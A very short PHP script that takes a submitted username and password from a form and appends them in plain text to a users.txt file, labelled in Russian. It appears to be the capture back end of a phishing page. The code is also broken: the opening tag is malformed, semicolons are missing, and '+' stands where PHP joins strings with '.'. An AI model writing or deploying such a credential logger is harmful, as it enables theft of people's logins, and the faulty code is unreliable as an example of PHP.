<? php
$si_un=$_POST['si_username']
$si_pasw=$_POST['si_password']
$filename = '/users.txt';
file_put_contents($filename, "Пользователь: "+$si_un+"Пароль: "+$si_pasw,FILE_APPEND);

?>
